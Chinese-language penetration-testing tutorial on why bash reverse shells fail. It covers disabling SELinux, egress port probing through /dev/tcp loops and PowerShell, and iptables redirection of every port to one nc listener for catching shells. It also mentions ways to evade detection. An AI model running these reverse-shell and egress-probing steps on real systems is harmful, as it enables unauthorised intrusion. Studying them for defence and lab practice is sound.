## 0x02 bash反弹失败原因总结

### 原因1：selinux在作怪

Linux机器被认为是最安全的操作系统之一，就是因为有着selinux的存在等原因。

**Redhat/Centos系统在安装的时候，默认安装了selinux；而ubuntu/kali系统在安装时默认不安装selinux，如果想要安装可以apt安装。**

在上一篇文章里面，留了一个问题如下图，请问是为什么？使用`echo 123 > /dev/tcp/192.168.91.135/6666` 也是这种报错。证明socks链接无法建立。

答案**就是selinux没有关闭。**

![](../Images/c427a6002a395b021decda6fd9da12b6.png)

关闭之后就可以重新愉快地bash反弹了，这里放出关于selinux的命令：

*   
*   
*   
*   

```
sestatussetenforce 0 #暂时关闭selinux，重启后无效vim /etc/sysconfig/selinuxSELINUX=enforcing #改为disabled永久关闭
```

![](../Images/f9f416dff8f93cfb4ffdeb599994ce72.png)

**注意：此种情况在实战环境下及其少见，基本也只有在实验环境下看得到了。如果selinux没有关闭，网站是无法链接到数据库的，所以一般生产环境是关闭了selinux的。**

### 原因4：防火墙禁止出站端口

首先要明白一下，windows和Linux系统防火墙默认不拦截**出站(注意是出站)**协议和端口。涉及到敏感操作时windows会弹出一个框提示你是否允许。

如果说我在windows系统的出站规则中新建了一个规则：禁止`1-65535`出站，这时候就完全访问不了外网了，防火墙不让你出去。

所以要是windows和Linux系统都默认禁止所有出站，那么用户的体验感是极差的，根本不知道自己为什么上不了网，毕竟防火墙还是比较高级的网络配置。

![](../Images/639554c8dc4af9a53232ac3e315ca193.png)

为了安全起见，Linux系统的服务器可能配置相关的操作禁止一些端口出站。比如我这里做一个比较绝的操作，禁止所有的端口出站：

*   
*   
*   

```
 iptables -L #查看iptables配置 iptables -P OUTPUT DROP #出站全部禁止 iptables -P OUTOUT ACCEPT #出站全部允许，默认就是此状态
```

我们来试一下，果然，啥协议和端口都不能用了，更别提bash反弹了。之后可以使用`iptables -P OUT ACCEPT`恢复。

![](../Images/4d15fc7452e628316f314197d1b3ab66.png)

#### 探测哪些端口可出站

**遍历探测端口脚本**：Linux可用**自带的shell编程**，windows可用**powershell**。

命令就是最基本的端口扫描套路：for循环遍历端口号与目标ip地址440-449拼接，随后与外网主动发起socks链接，timeout在0.5以内成功为端口出站，否则输出端口不出站，最终done终止脚本。

*   
*   
*   
*   
*   

```
 #Linux for i in {440..449};do timeout 0.5 bash -c "echo >/dev/tcp/<ip>/$i" && echo "$i************************open************************" || echo "$i closed";done  #windows powershell -c "6660..6669 | %{tnc -InformationLevel Quiet <ip> -port $_}"
```

上面的命令**既可以探测目标开放了哪些端口，也可以用来探测哪些端口出站。**

**如果此ip为baidu.com，那么就是为了探测baidu.com允许哪些端口入站，也就是开放了哪些端口，这个很好理解；**

![](../Images/65e21e096448cba076633e214ea6d65a.png)

![](../Images/fa5192256b24eb262c4758e2e8daf3ca.png)

**如果此命令是目标机发起，ip此时为kali监听的端口，那么就成了探测目标机哪些端口出站了。看不懂没关系，做个小实验：**

1、设置windows仅6666出站，随后kali监听1234，使用windows尝试访问一下

![](../Images/376f94bf62ff7bb4ea017a0607e483e7.png)

2、可以看到这里访问kali的1234失败，而kali监听6666，windows访问成功。![](../Images/88f2cd967bbfa5ed4762b8fe6dd86008.png)

![](../Images/aac3a23ecd07d4033046dbcb2a467bb9.png)

3、所以得出个小结论：**只有攻击端和目标的端口号一致，才可以探测出目标哪个端口出站。所以centos7使用命令来探测kali开放了哪个端口，其实就是centos7开放了哪个端口。**也就是下图所示的一一对应关系，才能判断出目标centos7哪个端口出站。

![](../Images/b319434223d2ee0b54ce63376ddf0581.png)

4、但要探测所有端口的话，centos7比较好办，可以用上面那么一长串的命令来一个一个遍历，但是kali机器的监听也要随着centos7的变化而变化。难不成我们要一个一个手工改kali的端口号么？？

不需要，我们这里想想，能不能kali只监听一个端口，就能探测所有的centos7端口信息呢？即：**攻击端(kali)的多个端口流量转发至单个汇聚端口，就只需监听单个汇聚端口，目标(centos)上发起多个端口探测，只要在攻击端转发的多个端口的范围内，那么，目标使用遍历端口脚本探测kali的监听端口，显示开放的端口，就是目标可出战的端口。同时攻击端的汇聚端口一定有访问记录。**

![](../Images/e473e6ae76911c919ca0089a55e94882.png)

1条命令就可以实现：

*   

```

```

`-A`           新建一条路由规则

`-t nat`       NAT模式

`-p`           指定tcp或者udp协议

`--dport`    目标端口，从外部流量进入监听端的端口

`-j`     指定接收的规则，ACCEPT接收、DROP抛弃、REDIRECT重定向。

`--to-port`  指定重定向端口

所以不难理解这条命令的含义为**新建一条tcp流量规则：访问我1-65535端口的流量都去8082端口报到！**

整个攻击端需要准备的命令整理如下：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
 #备份当前iptables规则 iptables-save > /tmp/firewall.rules #所有端口汇聚捆绑到8082，注意1:65535中间是冒号 iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 8082 #监听8082 nc -lnvp 8082 #恢复iptables规则 iptables-restore < /tmp/firewall.rules #或者直接删除所有nat规则 iptables -t nat -F #监听找到的端口6666，进行反弹shell nc -lnvp 6666
```

5、那么这时候，小实验的环境准备完毕：windows只允许6666出站，kali将1-65535端口流量汇聚到了8082上了。在windows机上使用遍历探测端口命令，探测出kali开放6666，因为kali和windows的端口一致性，所以windows的6666出站。Linux机器由于配置iptables出站较为复杂，这里不做演示，和windows一样。

## 0x03 总结

看完这篇文章，就明白了为什么说内网网络环境错综复杂了。目标机器做了哪些ip、端口、协议、流量的限制？应该用什么思路以及手法应对？我的思路以及手法是否行得通？尽最大可能本地模拟实现一下？都是值得我们去思考的问题。  

### bash反弹失败情况与对策

1、selinux在作怪：关闭selinux，试验环境常见，实战几乎遇不到。

2、没有bash命令：利用whereis命令来查看目标环境。

3、防火墙禁止协议出站：利用多种命令分别探测`http`、`icmp`、`DNS`协议。

4、防火墙禁止端口出站：利用遍历端口探测脚本与端口汇聚探测。

5、限制访问ip：ip白名单和黑名单。黑名单说白了就是你的ip被封了。无论黑白名单，都是Linux系统iptables等工具操作的防火墙。

6、内网检测出异常流量：通过openSSL加密流量。
